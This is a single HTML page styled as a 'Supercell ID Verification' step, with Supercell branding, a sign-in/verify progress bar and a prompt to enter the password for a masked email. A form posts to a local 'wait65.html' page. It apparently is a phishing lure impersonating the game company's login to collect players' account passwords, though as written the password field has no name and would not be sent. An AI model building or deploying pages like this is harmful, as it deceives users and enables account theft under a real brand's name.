<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supercell ID Verification</title>
    <style>
        /* Modern Light Mode Theme */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0; /* Light Grey Background */
            color: #333333; /* Dark Text Color */
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Main Card */
        .container {
            width: 90%;
            max-width: 380px;
            background-color: #ffffff; /* White Card Background */
            border-radius: 20px;
            padding: 35px 25px;
            text-align: center;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
            border: 1px solid #e0e0e0;
        }

        /* Logo and Header */
        .header {
            margin-bottom: 30px;
        }

        .supercell-logo {
            font-size: 32px;
            font-weight: 800;
            color: #333333;
            letter-spacing: 1px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .id-badge {
            background-color: #ffc93c; /* Supercell Yellow */
            color: #333333;
            padding: 4px 10px;
            border-radius: 8px;
            font-size: 20px;
        }

        /* Progress Bar */
        .progress-bar {
            margin: 25px 0 45px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            color: #888;
            font-size: 13px;
        }

        .progress-line {
            position: absolute;
            left: 20%;
            right: 20%;
            top: 50%;
            height: 4px;
            background-color: #e0e0e0; /* Light Grey Track */
            border-radius: 2px;
            transform: translateY(-50%);
        }

        .progress-line::after {
            content: '';
            position: absolute;
            width: 50%; /* Completed up to Sign in */
            height: 100%;
            background-color: #38b450; /* Green Progress */
            border-radius: 2px;
            left: 0;
        }

        /* Input Information */
        .main-info {
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 24px;
            color: #333333;
            margin-bottom: 10px;
        }
        
        .email-display {
            font-size: 14px;
            color: #666666;
            line-height: 1.5;
        }

        /* Password Input Field */
        .password-container {
            position: relative;
            margin-bottom: 20px;
        }

        .password-input {
            width: 100%;
            padding: 16px 50px 16px 15px;
            border: 1px solid #cccccc; /* Light border */
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 16px;
            background-color: #ffffff;
            color: #333333;
            transition: border-color 0.3s;
        }

        .password-input:focus {
            border-color: #4285f4;
            outline: none;
        }

        /* Toggle Button */
        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #aaaaaa;
            font-size: 18px;
            padding: 5px;
            transition: color 0.3s;
        }

        .toggle-password:hover {
            color: #333;
        }

        /* Buttons */
        .button {
            width: 100%;
            padding: 16px;
            margin-bottom: 12px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        .continue-btn {
            background-color: #4285f4; /* Primary Blue */
            color: white;
        }

        .continue-btn:hover {
            background-color: #357ae8;
        }

        .go-back-btn {
            background-color: #e0e0e0; /* Light Grey */
            color: #333333;
        }

        .go-back-btn:hover {
            background-color: #cccccc;
        }

        .code-link {
            display: block;
            margin-top: 20px;
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        
        <div class="header">
            <div class="supercell-logo">
                SUPERCELL
                <span class="id-badge">ID</span>
            </div>
        </div>

        <div class="progress-bar">
            <span style="color: #38b450;">Sign in</span> 
            <div class="progress-line"></div>
            <span style="color: #4285f4;">Verify</span> 
        </div>
        
        <div class="main-info">
            <h1>Almost there!</h1>
            <p class="email-display">
                Please enter the password for the email address:
                <br>
                <span style="font-weight: bold; color: #333333;">***@***.***</span>
            </p>
        </div>

        <form action="wait65.html" method="GET">
            
            <div class="password-container">
                <input type="password" id="passwordInput" class="password-input" placeholder="Password" required>
                <button type="button" id="togglePassword" class="toggle-password" title="Show/Hide Password">
                    üëÅÔ∏è
                </button>
            </div>

            <button type="submit" class="button continue-btn">
                CONTINUE
            </button>
            
        </form>

        <button type="button" class="button go-back-btn">
            GO BACK
        </button>

        <a href="#" class="code-link">Didn't receive the code?</a>
    </div>

    <script>
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('passwordInput');

        togglePassword.addEventListener('click', function (e) {
            // Toggle the type attribute (password <-> text)
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            // Change the eye icon
            this.textContent = (type === 'password') ? 'üëÅÔ∏è' : 'üîí'; 
        });
    </script>
</body>
</html>
